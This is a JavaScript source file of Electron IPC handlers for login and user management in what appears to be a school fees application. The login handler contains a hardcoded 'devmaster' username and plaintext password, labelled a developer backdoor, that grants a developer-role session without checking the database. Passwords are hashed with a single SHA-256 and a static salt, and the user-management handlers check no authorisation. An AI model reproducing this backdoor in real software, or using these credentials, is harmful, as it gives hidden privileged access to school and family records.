const { ipcMain } = require('electron')
const { getDb } = require('../lib/database')

module.exports = function register_authHandlers() {
// ─── Auth / Users ────────────────────────────────────────────────────────────
const crypto = require('crypto')

function hashPassword(pw) {
  return crypto.createHash('sha256').update(pw + 'schoolfees_salt_2025').digest('hex')
}

// DEVELOPER master login — hardcoded, never stored in DB
const DEV_CREDENTIALS = { username: 'devmaster', password: 'SF@Dev#2025!secure' }

ipcMain.handle('auth:login', (_, { username, password }) => {
  // Developer backdoor
  if (username === DEV_CREDENTIALS.username && password === DEV_CREDENTIALS.password) {
    return { ok: true, user: { id: 0, username: 'devmaster', full_name: 'Developer', role: 'developer', is_active: 1 } }
  }
  const db = getDb()
  const user = db.prepare('SELECT * FROM users WHERE username=? AND is_active=1').get([username])
  if (!user) return { ok: false, error: 'Invalid username or password' }
  if (user.password_hash !== hashPassword(password)) return { ok: false, error: 'Invalid username or password' }
  db.prepare("UPDATE users SET last_login=datetime('now') WHERE id=?").run([user.id])
  const { password_hash, ...safe } = user
  return { ok: true, user: safe }
})

ipcMain.handle('auth:list-users', () => {
  return getDb().prepare("SELECT id,username,full_name,role,is_active,last_login,created_at FROM users ORDER BY full_name").all()
})

ipcMain.handle('auth:create-user', (_, { username, full_name, password, role }) => {
  const db = getDb()
  try {
    const info = db.prepare('INSERT INTO users (username,full_name,password_hash,role) VALUES (?,?,?,?)')
      .run([username.trim().toLowerCase(), full_name.trim(), hashPassword(password), role])
    return { ok: true, id: info.lastInsertRowid }
  } catch(e) {
    if (e.message?.includes('UNIQUE')) throw new Error('Username already exists')
    throw e
  }
})

ipcMain.handle('auth:update-user', (_, { id, full_name, role, is_active, new_password }) => {
  const db = getDb()
  if (new_password) {
    db.prepare('UPDATE users SET full_name=?,role=?,is_active=?,password_hash=? WHERE id=?')
      .run([full_name, role, is_active, hashPassword(new_password), id])
  } else {
    db.prepare('UPDATE users SET full_name=?,role=?,is_active=? WHERE id=?')
      .run([full_name, role, is_active, id])
  }
  return { ok: true }
})

ipcMain.handle('auth:delete-user', (_, id) => {
  getDb().prepare('DELETE FROM users WHERE id=?').run([id])
  return { ok: true }
})

ipcMain.handle('auth:change-password', (_, { id, old_password, new_password }) => {
  const db = getDb()
  const user = db.prepare('SELECT * FROM users WHERE id=?').get([id])
  if (!user) throw new Error('User not found')
  if (user.password_hash !== hashPassword(old_password)) throw new Error('Current password is incorrect')
  db.prepare('UPDATE users SET password_hash=? WHERE id=?').run([hashPassword(new_password), id])
  return { ok: true }
})

}
